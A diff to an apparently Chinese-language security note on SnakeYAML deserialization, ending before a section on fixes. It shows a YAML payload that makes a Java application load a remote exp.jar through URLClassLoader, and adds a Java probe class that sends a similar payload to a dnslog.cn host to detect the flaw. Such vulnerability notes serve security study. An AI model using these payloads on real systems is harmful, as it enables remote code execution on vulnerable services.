@@ -30,7 +30,18 @@ yamlMap = yaml.load(inputStream);
 ```
 !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:7788/exp.jar"]]]]
 ```
-
+探测
+```
+public class Snakeyaml {
+    public static void main(String[] args) {
+        String context = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://fnsdae.dnslog.cn\"]]]]\n";
+        Yaml yaml = new Yaml();
+        yaml.load(context);
+    }
+}
+```
+网上工具
+<https://www.cnblogs.com/nice0e3/p/14514882.html>
 
 ^
 ## **修复**
